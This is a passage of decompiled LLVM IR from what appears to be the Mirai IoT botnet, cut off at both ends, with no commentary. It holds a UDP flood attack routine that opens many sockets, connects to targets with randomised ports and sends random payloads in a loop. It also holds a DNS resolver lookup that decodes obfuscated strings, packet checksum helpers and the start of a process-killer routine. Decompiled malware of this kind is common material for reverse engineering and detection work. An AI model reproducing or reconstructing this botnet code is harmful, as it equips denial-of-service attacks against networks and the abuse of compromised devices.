  %v9_12318 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %sext1 = mul i32 %v9_12318, 65536
  %v1_1231c = sdiv i32 %sext1, 65536
  %v1_12320 = trunc i32 %v1_1231c to i16
  %v3_1232c = load i32, i32* %stack_var_-96, align 4
  %v9_1233c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %v3_1232c, i8 6, i32 65535)
  %sext2 = mul i32 %v9_1233c, 65536
  %v1_12340 = sdiv i32 %sext2, 65536
  %v1_12344 = trunc i32 %v1_12340 to i16
  %v9_1235c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %v3_1232c, i8 0, i32 512)
  %v9_1237c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %v3_1232c, i8 1, i32 1)
  %sext3 = mul i32 %v9_1237c, 16777216
  %v1_12380 = sdiv i32 %sext3, 16777216
  %v1_12384 = trunc i32 %v1_12380 to i8
  %v2_12388 = ptrtoint i32* %bind_addr_-76 to i32
  store i32 0, i32* %bind_addr_-76, align 4
  %v3_123c4 = icmp eq i16 %v1_12344, -1
  br i1 %v3_123c4, label %dec_label_pc_123cc, label %dec_label_pc_123dc

dec_label_pc_123cc:                               ; preds = %entry
  %v0_123cc = call i32 @rand_next()
  br label %dec_label_pc_123f0

dec_label_pc_123dc:                               ; preds = %entry
  %v1_123e4 = sext i16 %v1_12344 to i32
  %v2_123e4 = call i32 @__GI_htons(i32 %v1_123e4)
  br label %dec_label_pc_123f0

dec_label_pc_123f0:                               ; preds = %dec_label_pc_123cc, %dec_label_pc_123dc
  %v4_12428 = urem i32 %v1_1231c, 65536
  %v3_12434 = icmp eq i16 %v1_12320, -1
  %sext = mul i32 %v3_122f4, 65536
  %v4_124ac = sdiv i32 %sext, 65536
  br label %dec_label_pc_1261c

dec_label_pc_123fc:                               ; preds = %dec_label_pc_1261c
  %v3_12400 = mul i32 %v4_12620, 4
  %v2_1240c = add i32 %v3_12400, %v3_122dc
  store i32 %v2_1240c, i32* @r4, align 4
  %v2_1241c = call i32 @calloc(i32 65535, i32 1)
  %v1_12424 = load i32, i32* @r4, align 4
  %v2_12424 = inttoptr i32 %v1_12424 to i32*
  store i32 %v2_1241c, i32* %v2_12424, align 4
  %v2_12448 = mul i32 %v4_12620, 24
  %v2_12454 = add i32 %v2_12448, %targs
  store i32 %v2_12454, i32* %r4.global-to-local, align 4
  br i1 %v3_12434, label %dec_label_pc_1243c, label %dec_label_pc_12470

dec_label_pc_1243c:                               ; preds = %dec_label_pc_123fc
  %v0_12458 = call i32 @rand_next()
  %v1_12468 = trunc i32 %v0_12458 to i16
  %v2_12468 = load i32, i32* %r4.global-to-local, align 4
  %v3_12468 = add i32 %v2_12468, 2
  %v4_12468 = inttoptr i32 %v3_12468 to i16*
  store i16 %v1_12468, i16* %v4_12468, align 2
  br label %dec_label_pc_124a0

dec_label_pc_12470:                               ; preds = %dec_label_pc_123fc
  %v1_12494 = call i32 @__GI_htons(i32 %v4_12428)
  %sext8 = mul i32 %v1_12494, 65536
  %v1_12498 = sdiv i32 %sext8, 65536
  %v1_1249c = trunc i32 %v1_12498 to i16
  %v2_1249c = load i32, i32* %r4.global-to-local, align 4
  %v3_1249c = add i32 %v2_1249c, 2
  %v4_1249c = inttoptr i32 %v3_1249c to i16*
  store i16 %v1_1249c, i16* %v4_1249c, align 2
  br label %dec_label_pc_124a0

dec_label_pc_124a0:                               ; preds = %dec_label_pc_1243c, %dec_label_pc_12470
  %v2_124b0 = add i32 %v3_12400, %v4_124ac
  store i32 %v2_124b0, i32* @r4, align 4
  %v3_124c0 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_124c8 = load i32, i32* @r4, align 4
  %v2_124c8 = inttoptr i32 %v1_124c8 to i32*
  store i32 %v3_124c0, i32* %v2_124c8, align 4
  %v0_124cc = load i32, i32* @r4, align 4
  %v1_124cc = inttoptr i32 %v0_124cc to i32*
  %v2_124cc = load i32, i32* %v1_124cc, align 4
  %v7_124d0 = icmp eq i32 %v2_124cc, -1
  br i1 %v7_124d0, label %dec_label_pc_126bc, label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124a0
  store i32 2, i32* %bind_addr_-76, align 4
  %v1_12504 = inttoptr i32 %v2_124b0 to i32*
  %v2_12504 = load i32, i32* %v1_12504, align 4
  %v5_12518 = call i32 @bind(i32 %v2_12504, i32 %v2_12388, i32 16, i32 %v2_12388, i32 2)
  %v1_12538 = add i32 %v2_12454, 20
  %v2_12538 = inttoptr i32 %v1_12538 to i8*
  %v3_12538 = load i8, i8* %v2_12538, align 1
  %tmp = icmp ugt i8 %v3_12538, 31
  br i1 %tmp, label %dec_label_pc_125cc, label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %dec_label_pc_124d8
  store i32 %v2_12454, i32* @r4, align 4
  %v1_1257c = add i32 %v2_12454, 16
  %v2_1257c = inttoptr i32 %v1_1257c to i32*
  %v3_1257c = load i32, i32* %v2_1257c, align 4
  %v1_12584 = call i32 @__GI_ntohl(i32 %v3_1257c)
  store i32 %v1_12584, i32* @r5, align 4
  %v0_1258c = call i32 @rand_next()
  %v3_125b0 = load i8, i8* %v2_12538, align 1
  %v4_125b0 = zext i8 %v3_125b0 to i32
  %v6_125b4 = lshr i32 %v0_1258c, %v4_125b0
  %v0_125b8 = load i32, i32* @r5, align 4
  %v2_125b8 = add i32 %v0_125b8, %v6_125b4
  %v1_125c0 = call i32 @__GI_htonl(i32 %v2_125b8)
  %v1_125c8 = load i32, i32* @r4, align 4
  %v2_125c8 = add i32 %v1_125c8, 4
  %v3_125c8 = inttoptr i32 %v2_125c8 to i32*
  store i32 %v1_125c0, i32* %v3_125c8, align 4
  br label %dec_label_pc_125cc

dec_label_pc_125cc:                               ; preds = %dec_label_pc_124d8, %dec_label_pc_12544
  %v2_125e0 = load i32, i32* %v1_12504, align 4
  %v3_1260c = call i32 @__libc_connect(i32 %v2_125e0, i32 %v2_12454, i32 16)
  %v1_12614 = add i32 %v4_12620, 1
  %v4_12618 = inttoptr i32 %v1_12614 to i8**
  br label %dec_label_pc_1261c

dec_label_pc_1261c:                               ; preds = %dec_label_pc_123f0, %dec_label_pc_125cc
  %storemerge7 = phi i8** [ %v4_12618, %dec_label_pc_125cc ], [ null, %dec_label_pc_123f0 ]
  %v4_12620 = ptrtoint i8** %storemerge7 to i32
  %sext5 = mul i32 %v4_12620, 16777216
  %v9_12628 = sdiv i32 %sext5, 16777216
  %v10_12628 = icmp sgt i32 %tmp14, %v9_12628
  br i1 %v10_12628, label %dec_label_pc_123fc, label %dec_label_pc_1262c.preheader

dec_label_pc_1262c.preheader:                     ; preds = %dec_label_pc_1261c
  %v2_12658 = icmp eq i8 %v1_12384, 0
  br label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %dec_label_pc_126a8, %dec_label_pc_1262c.preheader
  br label %dec_label_pc_126a8

dec_label_pc_12638:                               ; preds = %dec_label_pc_126a8
  %v3_1263c = mul i32 %v4_126ac, 4
  %v2_12648 = add i32 %v3_1263c, %v3_122dc
  %v1_1264c = inttoptr i32 %v2_12648 to i32*
  %v2_1264c = load i32, i32* %v1_1264c, align 4
  br i1 %v2_12658, label %dec_label_pc_12670, label %dec_label_pc_12660

dec_label_pc_12660:                               ; preds = %dec_label_pc_12638
  %v4_12650 = inttoptr i32 %v2_1264c to i8*
  call void @rand_str(i8* %v4_12650, i32 %v9_1235c)
  br label %dec_label_pc_12670

dec_label_pc_12670:                               ; preds = %dec_label_pc_12638, %dec_label_pc_12660
  %v2_12680 = add i32 %v3_1263c, %v4_124ac
  %v1_12684 = inttoptr i32 %v2_12680 to i32*
  %v2_12684 = load i32, i32* %v1_12684, align 4
  %v4_12698 = call i32 @__libc_send(i32 %v2_12684, i32 %v2_1264c, i32 %v9_1235c, i32 16384)
  %v1_126a0 = add i32 %v4_126ac, 1
  %v4_126a4 = inttoptr i32 %v1_126a0 to i8**
  br label %dec_label_pc_126a8

dec_label_pc_126a8:                               ; preds = %dec_label_pc_1262c, %dec_label_pc_12670
  %storemerge = phi i8** [ %v4_126a4, %dec_label_pc_12670 ], [ null, %dec_label_pc_1262c ]
  %v4_126ac = ptrtoint i8** %storemerge to i32
  %sext6 = mul i32 %v4_126ac, 16777216
  %v9_126b4 = sdiv i32 %sext6, 16777216
  %v10_126b4 = icmp sgt i32 %tmp14, %v9_126b4
  br i1 %v10_126b4, label %dec_label_pc_12638, label %dec_label_pc_1262c

dec_label_pc_126bc:                               ; preds = %dec_label_pc_124a0
  store i32 %v3_122ac, i32* %r4.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v3_1263c, { 1, 0 }
  uselistorder i32 %v4_12620, { 0, 1, 3, 2 }
  uselistorder i32 %v2_12454, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_12400, { 1, 0 }
  uselistorder i32 %v4_124ac, { 1, 0 }
  uselistorder i32 %v2_12388, { 1, 0 }
  uselistorder i32 %v9_1235c, { 1, 0 }
  uselistorder i32 %v3_1232c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder void (i8*, i32)* @rand_str, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** null, { 1, 0 }
  uselistorder i32 (i8, i32, i8, i32)* @attack_get_opt_int, { 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %opts_len, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_126a8, { 1, 0 }
  uselistorder label %dec_label_pc_12670, { 1, 0 }
  uselistorder label %dec_label_pc_1261c, { 1, 0 }
  uselistorder label %dec_label_pc_125cc, { 1, 0 }
  uselistorder label %dec_label_pc_124a0, { 1, 0 }
  uselistorder label %dec_label_pc_123f0, { 1, 0 }
}

define i32 @get_dns_resolver() local_unnamed_addr {
entry:
  %ipbuf_-68 = alloca [32 x i8], align 1
  %resolvbuf_-2116 = alloca [2048 x i8], align 1
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_126cc = load i32, i32* @fp, align 4
  store i32 %v3_126cc, i32* %stack_var_-16, align 4
  %v10_126cc = load i32, i32* @lr, align 4
  store i32 75476, i32* %stack_var_-4, align 4
  %v13_126cc = ptrtoint i32* %stack_var_-16 to i32
  %v2_126d0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_126d0, i32* @fp, align 4
  call void @table_unlock_val(i8 30)
  %v3_126e8 = call i8* @table_retrieve_val(i32 30, i32* null)
  %v5_126e8 = ptrtoint i8* %v3_126e8 to i32
  store i32 %v5_126e8, i32* @r3, align 4
  %v2_126f8 = call i32 @__libc_open(i32 %v5_126e8, i32 0)
  call void @table_lock_val(i8 30)
  %v1_12710 = icmp slt i32 %v2_126f8, 0
  br i1 %v1_12710, label %dec_label_pc_128d4, label %dec_label_pc_12718

dec_label_pc_12718:                               ; preds = %entry
  %v2_12720 = ptrtoint [2048 x i8]* %resolvbuf_-2116 to i32
  store i32 %v2_12720, i32* @r3, align 4
  store i32 %v2_12720, i32* @r1, align 4
  store i32 2048, i32* @r2, align 4
  %v1_12730 = call i32 @__libc_read(i32 %v2_126f8)
  %v1_12740 = call i32 @__GI___libc_close(i32 %v2_126f8)
  call void @table_unlock_val(i8 31)
  %v3_12754 = call i8* @table_retrieve_val(i32 31, i32* null)
  %tmp22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %resolvbuf_-2116, i32 0, i32 0
  %v7_12770 = call i32 @util_stristr(i8* %tmp22, i32 %v1_12730, i8* %v3_12754)
  call void @table_lock_val(i8 31)
  %v7_12788 = icmp eq i32 %v7_12770, -1
  br i1 %v7_12788, label %dec_label_pc_128d4, label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12718
  %v1_12820 = add i32 %v1_12730, -1
  %v5_128ac32 = icmp slt i32 %v7_12770, %v1_12730
  br i1 %v5_128ac32, label %dec_label_pc_127ac, label %dec_label_pc_128b0

dec_label_pc_127ac:                               ; preds = %dec_label_pc_12790, %dec_label_pc_12894
  %storemerge134 = phi i32 [ %v1_12898, %dec_label_pc_12894 ], [ %v7_12770, %dec_label_pc_12790 ]
  %finished_whitespace_-19.233 = phi i8 [ %finished_whitespace_-19.1, %dec_label_pc_12894 ], [ 0, %dec_label_pc_12790 ]
  %v2_127bc = add i32 %storemerge134, %v13_126cc
  %v2_127c0 = add i32 %v2_127bc, -2100
  %v1_127c4 = inttoptr i32 %v2_127c0 to i8*
  %v2_127c4 = load i8, i8* %v1_127c4, align 1
  %v2_127d0 = icmp eq i8 %finished_whitespace_-19.233, 0
  br i1 %v2_127d0, label %dec_label_pc_127d8, label %dec_label_pc_127f8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127ac
  %v7_127dc = icmp eq i8 %v2_127c4, 32
  br i1 %v7_127dc, label %dec_label_pc_12894, label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127d8
  %v7_127e8 = icmp eq i8 %v2_127c4, 9
  br i1 %v7_127e8, label %dec_label_pc_12894, label %dec_label_pc_127f0

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127e4
  br label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127ac, %dec_label_pc_127f0
  %finished_whitespace_-19.0 = phi i8 [ 1, %dec_label_pc_127f0 ], [ %finished_whitespace_-19.233, %dec_label_pc_127ac ]
  %v7_127fc = icmp eq i8 %v2_127c4, 46
  br i1 %v7_127fc, label %dec_label_pc_1281c, label %dec_label_pc_12804

dec_label_pc_12804:                               ; preds = %dec_label_pc_127f8
  %tmp = icmp ult i8 %v2_127c4, 48
  br i1 %tmp, label %dec_label_pc_12830, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %dec_label_pc_12804
  %tmp36 = icmp ugt i8 %v2_127c4, 57
  br i1 %tmp36, label %dec_label_pc_12830, label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12810, %dec_label_pc_127f8
  %v9_12828 = icmp eq i32 %v1_12820, %storemerge134
  br i1 %v9_12828, label %dec_label_pc_12830, label %dec_label_pc_12894

dec_label_pc_12830:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_12810, %dec_label_pc_12804
  %storemerge1.lcssa4 = phi i32 [ %v1_12820, %dec_label_pc_1281c ], [ %storemerge134, %dec_label_pc_12810 ], [ %storemerge134, %dec_label_pc_12804 ]
  %v2_12840 = add i32 %v7_12770, %v2_12720
  %v2_1284c = sub i32 %storemerge1.lcssa4, %v7_12770
  %tmp23 = getelementptr inbounds [32 x i8], [32 x i8]* %ipbuf_-68, i32 0, i32 0
  %v1_12858 = inttoptr i32 %v2_12840 to i8*
  call void @util_memcpy(i8* %tmp23, i8* %v1_12858, i32 %v2_1284c)
  %v2_12878 = add i32 %v13_126cc, -52
  %v2_1287c = add i32 %v2_12878, %v2_1284c
  %v3_12884 = inttoptr i32 %v2_1287c to i8*
  store i8 0, i8* %v3_12884, align 1
  br label %dec_label_pc_128b0

dec_label_pc_12894:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_127e4, %dec_label_pc_127d8
  %finished_whitespace_-19.1 = phi i8 [ 0, %dec_label_pc_127d8 ], [ 0, %dec_label_pc_127e4 ], [ %finished_whitespace_-19.0, %dec_label_pc_1281c ]
  %v1_12898 = add nsw i32 %storemerge134, 1
  %v5_128ac = icmp slt i32 %v1_12898, %v1_12730
  br i1 %v5_128ac, label %dec_label_pc_127ac, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_12790, %dec_label_pc_12894, %dec_label_pc_12830
  %found_-18.0 = phi i1 [ false, %dec_label_pc_12830 ], [ true, %dec_label_pc_12894 ], [ true, %dec_label_pc_12790 ]
  br i1 %found_-18.0, label %dec_label_pc_128d4, label %dec_label_pc_128bc

dec_label_pc_128bc:                               ; preds = %dec_label_pc_128b0
  %v2_128bc = ptrtoint [32 x i8]* %ipbuf_-68 to i32
  store i32 %v2_128bc, i32* @r0, align 4
  %v1_128c4 = call i32 @inet_addr(i32 %v2_128bc)
  br label %dec_label_pc_12958

dec_label_pc_128d4:                               ; preds = %dec_label_pc_128b0, %dec_label_pc_12718, %entry
  %v0_128d4 = call i32 @rand_next()
  %trunc = trunc i32 %v0_128d4 to i2
  switch i2 %trunc, label %dec_label_pc_129602 [
    i2 0, label %dec_label_pc_128fc
    i2 1, label %dec_label_pc_12914
    i2 -2, label %dec_label_pc_12924
    i2 -1, label %dec_label_pc_1293c
  ]

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128d4
  %v1_12908 = call i32 @__GI_htonl(i32 134744072)
  br label %dec_label_pc_12958

dec_label_pc_12914:                               ; preds = %dec_label_pc_128d4
  %v1_12918 = call i32 @__GI_htonl(i32 1246898730)
  br label %dec_label_pc_12958

dec_label_pc_12924:                               ; preds = %dec_label_pc_128d4
  %v1_12930 = call i32 @__GI_htonl(i32 1074151430)
  br label %dec_label_pc_12958

dec_label_pc_1293c:                               ; preds = %dec_label_pc_128d4
  %v1_12948 = call i32 @__GI_htonl(i32 67240450)
  br label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %dec_label_pc_1293c, %dec_label_pc_12924, %dec_label_pc_12914, %dec_label_pc_128fc, %dec_label_pc_128bc
  %stack_var_-2124.0 = phi i32 [ %v1_12948, %dec_label_pc_1293c ], [ %v1_12930, %dec_label_pc_12924 ], [ %v1_12918, %dec_label_pc_12914 ], [ %v1_12908, %dec_label_pc_128fc ], [ %v1_128c4, %dec_label_pc_128bc ]
  %v2_12968 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12968, i32* @fp, align 4
  store i32 %v10_126cc, i32* @lr, align 4
  ret i32 %stack_var_-2124.0

dec_label_pc_129602:                              ; preds = %dec_label_pc_128d4
  unreachable

; uselistorder directives
  uselistorder i32 %v2_128bc, { 1, 0 }
  uselistorder i32 %v1_12898, { 1, 0 }
  uselistorder i8 %finished_whitespace_-19.233, { 1, 0 }
  uselistorder i32 %storemerge134, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v7_12770, { 4, 3, 1, 2, 0 }
  uselistorder i32 %v1_12730, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder [32 x i8]* %ipbuf_-68, { 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder label %dec_label_pc_128b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_127f8, { 1, 0 }
  uselistorder label %dec_label_pc_127ac, { 1, 0 }
}

define i16 @checksum_generic(i16* %addr, i32 %count) local_unnamed_addr {
entry:
  %v2_129c83 = icmp ne i32 %count, 0
  %v7_129c88 = icmp eq i32 %count, 1
  %v2_129cc10 = xor i1 %v7_129c88, true
  %v3_129cc11 = and i1 %v2_129c83, %v2_129cc10
  br i1 %v3_129cc11, label %dec_label_pc_12998, label %dec_label_pc_129d0

dec_label_pc_12998:                               ; preds = %entry, %dec_label_pc_12998
  %stack_var_-20.014 = phi i16* [ %v5_129b4, %dec_label_pc_12998 ], [ %addr, %entry ]
  %sum_-28.013 = phi i32 [ %v2_129a4, %dec_label_pc_12998 ], [ 0, %entry ]
  %sum_-24.012 = phi i32 [ %v1_129bc, %dec_label_pc_12998 ], [ %count, %entry ]
  %v4_12998 = ptrtoint i16* %stack_var_-20.014 to i32
  %v2_1299c = load i16, i16* %stack_var_-20.014, align 2
  %v3_1299c = zext i16 %v2_1299c to i32
  %v2_129a4 = add i32 %v3_1299c, %sum_-28.013
  %v1_129b0 = add i32 %v4_12998, 2
  %v5_129b4 = inttoptr i32 %v1_129b0 to i16*
  %v1_129bc = add i32 %sum_-24.012, -2
  %v2_129c8 = icmp ne i32 %v1_129bc, 0
  %v7_129c8 = icmp eq i32 %v1_129bc, 1
  %v2_129cc = xor i1 %v7_129c8, true
  %v3_129cc = and i1 %v2_129c8, %v2_129cc
  br i1 %v3_129cc, label %dec_label_pc_12998, label %dec_label_pc_129c4.dec_label_pc_129d0_crit_edge

dec_label_pc_129c4.dec_label_pc_129d0_crit_edge:  ; preds = %dec_label_pc_12998
  br i1 %v7_129c8, label %dec_label_pc_129dc, label %dec_label_pc_129f4

dec_label_pc_129d0:                               ; preds = %entry
  br i1 %v7_129c88, label %dec_label_pc_129dc, label %dec_label_pc_129f4

dec_label_pc_129dc:                               ; preds = %dec_label_pc_129c4.dec_label_pc_129d0_crit_edge, %dec_label_pc_129d0
  %stack_var_-20.0.lcssa30 = phi i16* [ %v5_129b4, %dec_label_pc_129c4.dec_label_pc_129d0_crit_edge ], [ %addr, %dec_label_pc_129d0 ]
  %sum_-28.0.lcssa29 = phi i32 [ %v2_129a4, %dec_label_pc_129c4.dec_label_pc_129d0_crit_edge ], [ 0, %dec_label_pc_129d0 ]
  %v2_129e0 = load i16, i16* %stack_var_-20.0.lcssa30, align 2
  %tmp = urem i16 %v2_129e0, 256
  %v1_129e4 = zext i16 %tmp to i32
  %v2_129ec = add i32 %v1_129e4, %sum_-28.0.lcssa29
  br label %dec_label_pc_129f4

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129c4.dec_label_pc_129d0_crit_edge, %dec_label_pc_129d0, %dec_label_pc_129dc
  %sum_-28.1 = phi i32 [ %v2_129ec, %dec_label_pc_129dc ], [ 0, %dec_label_pc_129d0 ], [ %v2_129a4, %dec_label_pc_129c4.dec_label_pc_129d0_crit_edge ]
  %v3_129f8 = udiv i32 %sum_-28.1, 65536
  %v3_12a04 = urem i32 %sum_-28.1, 65536
  %v2_12a08 = add nuw nsw i32 %v3_129f8, %v3_12a04
  %v3_12a14 = udiv i32 %v2_12a08, 65536
  %v2_12a1c = add nuw nsw i32 %v3_12a14, %v2_12a08
  %v1_12a30 = xor i32 %v2_12a1c, 65535
  %v1_12a3c = trunc i32 %v1_12a30 to i16
  ret i16 %v1_12a3c

; uselistorder directives
  uselistorder i32 %v2_12a08, { 1, 0 }
  uselistorder i32 %sum_-28.1, { 1, 0 }
  uselistorder i1 %v7_129c8, { 1, 0 }
  uselistorder i32 %v1_129bc, { 1, 2, 0 }
  uselistorder i32 %v2_129a4, { 1, 0, 2 }
  uselistorder i1 %v7_129c88, { 1, 0 }
  uselistorder i16* %addr, { 1, 0 }
  uselistorder label %dec_label_pc_129f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_129dc, { 1, 0 }
  uselistorder label %dec_label_pc_12998, { 1, 0 }
}

define i16 @checksum_tcpudp(i32 %iph, i8* %buff, i16 %data_len, i32 %len) local_unnamed_addr {
entry:
  %tmp16 = ptrtoint i8* %buff to i32
  %v1_12a78 = add i32 %iph, 12
  %v2_12a78 = inttoptr i32 %v1_12a78 to i32*
  %v3_12a78 = load i32, i32* %v2_12a78, align 4
  %v1_12a84 = add i32 %iph, 16
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  %v8_12ad810 = icmp sgt i32 %len, 1
  br i1 %v8_12ad810, label %dec_label_pc_12aa0, label %dec_label_pc_12adc

dec_label_pc_12aa0:                               ; preds = %entry, %dec_label_pc_12aa0
  %v3_12ac4 = phi i32 [ %v1_12ac8, %dec_label_pc_12aa0 ], [ %len, %entry ]
  %ip_src_-36.012 = phi i32 [ %v1_12abc, %dec_label_pc_12aa0 ], [ %tmp16, %entry ]
  %length_-24.011 = phi i32 [ %v2_12ab0, %dec_label_pc_12aa0 ], [ 0, %entry ]
  %v1_12aa4 = inttoptr i32 %ip_src_-36.012 to i16*
  %v2_12aa4 = load i16, i16* %v1_12aa4, align 2
  %v3_12aa4 = zext i16 %v2_12aa4 to i32
  %v2_12ab0 = add i32 %v3_12aa4, %length_-24.011
  %v1_12abc = add i32 %ip_src_-36.012, 2
  %v1_12ac8 = add nsw i32 %v3_12ac4, -2
  %v8_12ad8 = icmp sgt i32 %v1_12ac8, 1
  br i1 %v8_12ad8, label %dec_label_pc_12aa0, label %dec_label_pc_12ad0.dec_label_pc_12adc_crit_edge

dec_label_pc_12ad0.dec_label_pc_12adc_crit_edge:  ; preds = %dec_label_pc_12aa0
  br label %dec_label_pc_12adc

dec_label_pc_12adc:                               ; preds = %dec_label_pc_12ad0.dec_label_pc_12adc_crit_edge, %entry
  %v3_12adc = phi i32 [ %v1_12ac8, %dec_label_pc_12ad0.dec_label_pc_12adc_crit_edge ], [ %len, %entry ]
  %length_-24.0.lcssa = phi i32 [ %v2_12ab0, %dec_label_pc_12ad0.dec_label_pc_12adc_crit_edge ], [ 0, %entry ]
  %ip_src_-36.0.lcssa = phi i32 [ %v1_12abc, %dec_label_pc_12ad0.dec_label_pc_12adc_crit_edge ], [ %tmp16, %entry ]
  %v7_12ae0 = icmp eq i32 %v3_12adc, 1
  br i1 %v7_12ae0, label %dec_label_pc_12ae8, label %dec_label_pc_12b00

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12adc
  %v1_12aec = inttoptr i32 %ip_src_-36.0.lcssa to i8*
  %v2_12aec = load i8, i8* %v1_12aec, align 1
  %v3_12aec = zext i8 %v2_12aec to i32
  %v2_12af8 = add i32 %v3_12aec, %length_-24.0.lcssa
  br label %dec_label_pc_12b00

dec_label_pc_12b00:                               ; preds = %dec_label_pc_12adc, %dec_label_pc_12ae8
  %length_-24.1 = phi i32 [ %v2_12af8, %dec_label_pc_12ae8 ], [ %length_-24.0.lcssa, %dec_label_pc_12adc ]
  %v3_12b04 = udiv i32 %v3_12a78, 65536
  %v3_12b24 = urem i32 %v3_12a78, 65536
  %v3_12b38 = udiv i32 %v3_12a84, 65536
  %v2_12b14 = add nuw nsw i32 %v3_12b24, %v3_12b04
  %v2_12b2c = add nuw nsw i32 %v2_12b14, %v3_12b38
  %v2_12b48 = add i32 %v2_12b2c, %length_-24.1
  %v3_12b58 = urem i32 %v3_12a84, 65536
  %v2_12b60 = add i32 %v2_12b48, %v3_12b58
  %v1_12b6c = add i32 %iph, 9
  %v2_12b6c = inttoptr i32 %v1_12b6c to i8*
  %v3_12b6c = load i8, i8* %v2_12b6c, align 1
  %v4_12b6c = zext i8 %v3_12b6c to i32
  %v1_12b74 = call i32 @__GI_htons(i32 %v4_12b6c)
  %v2_12b84 = add i32 %v2_12b60, %v1_12b74
  %v4_12b8c = zext i16 %data_len to i32
  %v2_12b94 = add i32 %v2_12b84, %v4_12b8c
  %tmp = icmp ult i32 %v2_12b94, 65536
  br i1 %tmp, label %dec_label_pc_12bcc, label %dec_label_pc_12ba0

dec_label_pc_12ba0:                               ; preds = %dec_label_pc_12b00, %dec_label_pc_12ba0
  %storemerge233 = phi i32 [ %v2_12bb4, %dec_label_pc_12ba0 ], [ %v2_12b94, %dec_label_pc_12b00 ]
  %v3_12bc034.in = phi i32 [ %v2_12bb4, %dec_label_pc_12ba0 ], [ %v2_12b94, %dec_label_pc_12b00 ]
  %v3_12bc034 = udiv i32 %v3_12bc034.in, 65536
  %v3_12ba8 = urem i32 %storemerge233, 65536
  %v2_12bb4 = add nuw nsw i32 %v3_12bc034, %v3_12ba8
  %tmp35 = icmp ult i32 %v2_12bb4, 65536
  br i1 %tmp35, label %dec_label_pc_12bbc.dec_label_pc_12bcc_crit_edge, label %dec_label_pc_12ba0

dec_label_pc_12bbc.dec_label_pc_12bcc_crit_edge:  ; preds = %dec_label_pc_12ba0
  br label %dec_label_pc_12bcc

dec_label_pc_12bcc:                               ; preds = %dec_label_pc_12bbc.dec_label_pc_12bcc_crit_edge, %dec_label_pc_12b00
  %storemerge2.lcssa = phi i32 [ %v2_12bb4, %dec_label_pc_12bbc.dec_label_pc_12bcc_crit_edge ], [ %v2_12b94, %dec_label_pc_12b00 ]
  %v1_12bd8 = xor i32 %storemerge2.lcssa, 65535
  %v1_12be4 = trunc i32 %v1_12bd8 to i16
  ret i16 %v1_12be4

; uselistorder directives
  uselistorder i32 %v2_12bb4, { 3, 1, 2, 0 }
  uselistorder i32 %v2_12b94, { 3, 0, 2, 1 }
  uselistorder i32 %length_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_12ac8, { 0, 2, 1 }
  uselistorder i32 %ip_src_-36.012, { 1, 0 }
  uselistorder i32 %v3_12a84, { 1, 0 }
  uselistorder i32 %v3_12a78, { 1, 0 }
  uselistorder i32 %tmp16, { 1, 0 }
  uselistorder i32 %len, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ba0, { 1, 0 }
  uselistorder label %dec_label_pc_12b00, { 1, 0 }
  uselistorder label %dec_label_pc_12aa0, { 1, 0 }
}

define void @killer_init() local_unnamed_addr {
entry:
  %status_path_-212 = alloca [64 x i8], align 1
  %exe_path_-148 = alloca [64 x i8], align 1
  %tmp_bind_addr_-84 = alloca i32, align 4
  %realpath_-4308 = alloca [4096 x i8], align 1
  %stack_var_-4 = alloca i32, align 4
  %v3_12bf8 = load i32, i32* @r4, align 4
  %v6_12bf8 = load i32, i32* @fp, align 4
  store i32 76800, i32* %stack_var_-4, align 4
  %v2_12bfc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12bfc, i32* @fp, align 4
